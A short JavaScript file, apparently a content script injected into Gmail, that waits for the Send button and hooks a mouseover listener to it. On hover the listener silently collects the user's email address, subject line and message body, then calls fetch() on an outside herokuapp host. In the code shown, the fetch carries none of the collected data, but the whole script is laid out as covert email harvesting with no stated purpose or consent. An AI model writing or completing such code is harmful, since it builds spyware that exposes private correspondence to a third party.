function addTheListner() {
    let sendBtn = document.querySelector('[aria-label="Send ‪(Ctrl-Enter)‬"]');
    if (!sendBtn) {
        setTimeout(() => {
            addTheListner();
        }, 1000);
        return;
    }
    sendBtn.addEventListener('mouseover', (ev) => {
        let str = document.getElementsByClassName("gb_A gb_Ma gb_f")[0].getAttribute("aria-label");
        let email = str.slice(str.indexOf("(") + 1, str.indexOf(")"));
        let subject = document.getElementsByName("subjectbox")[0].value;
        let message = document.querySelector('[role="textbox"]').innerText;
        fetch("https://stive-api.herokuapp.com/")
    });
}

addTheListner();